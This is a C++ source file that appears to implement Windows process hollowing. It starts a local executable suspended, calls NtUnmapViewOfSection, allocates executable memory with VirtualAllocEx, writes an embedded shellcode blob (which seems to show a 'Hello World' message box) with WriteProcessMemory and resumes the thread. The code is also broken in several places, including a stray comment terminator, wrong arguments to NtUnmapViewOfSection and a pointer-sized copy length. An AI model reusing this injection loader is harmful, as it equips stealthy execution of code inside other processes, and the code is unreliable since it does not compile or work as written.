#include <stdio.h>
#include <tchar.h>
#include <stdio.h>
#include <iostream>
#include <stddef.h>
#include <windows.h>
#include <winternl.h>


using namespace std;

int main()
{
	char *shellcode = "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
    "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
    "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
    "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";  // A simple basic shellcode
    
    
	STARTUPINFO startupinfo;  // Wil hold sartup information about the executed process
	PROCESS_INFORMATION p;  // Will hold the process infomration
	
	memset(&startupinfo,0,sizeof(startupinfo));
	
	// Create the process in suspended mode
	int reaction = CreateProcess("E:\\C++ projects\\some.exe",NULL,NULL,NULL,0,CREATE_SUSPENDED,NULL,NULL,&startupinfo,&p);  // Create the process in suspended mode
	if (!reaction) {
		printf("Could not start process %d\n",GetLastError());
		return 1;
	}
	printf("The pid %d \n",p.dwProcessId);
	
	// Get module handle to ntdll.dll and the process address to ntunmapviewofsection
	//NtUnmapViewOfsection()
	HMODULE handle = LoadLibrary("ntdll.dll");
	if (!handle) {
		cout << "Could not get handle of the module " << GetLastError();
		return 0;
	}
	FARPROC ntunmap = GetProcAddress(handle,"NtUnmapViewOfSection");
	if (!ntunmap) {
		cout << "Could not get address of the nthandle function " << GetLastError();
		return 0; 
	}
	printf("Address of ntunmapview of funciton: %p\n",ntunmap);
	cout << "Address of ntunmapview of funciton: " << ntunmap << endl;

	int ress = ntunmap(p.hProcess,(void *)p.hProcess);
	cout << ress;

	
	void *pAddress = VirtualAllocEx(p.hProcess,(void *)0x0000000000401591,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);  // Allocate memory
	if (!pAddress) {
		cout << "Error allocating space " << GetLastError() << endl;
		return 1;
	}
	
	std::size_t written = 0;
	reaction = WriteProcessMemory(p.hProcess,pAddress,shellcode,sizeof(shellcode),&written);
	if (!reaction) {
		cout << "Could not write to remote process " << GetLastError() << endl;
		return 1;
	}
	cout << "Writin to remote process was a success " << endl;
	cout << "Please enter to continue: ";
	
	cout<< (void *)p.hProcess << endl;
	HMODULE hnd = GetModuleHandle(TEXT("E:\\C++ projects\\some.exe"));
	if (!hnd) {
		cout << "Coudl not get handle to procss: " << GetLastError() << endl;
	}
	cout << (void *)hnd << endl;
	//ReadProcessMemory(p.hProcess,)
	getchar();
	*/
	ResumeThread(p.hThread);
	cout << p.hProcess << endl;
	
    
}
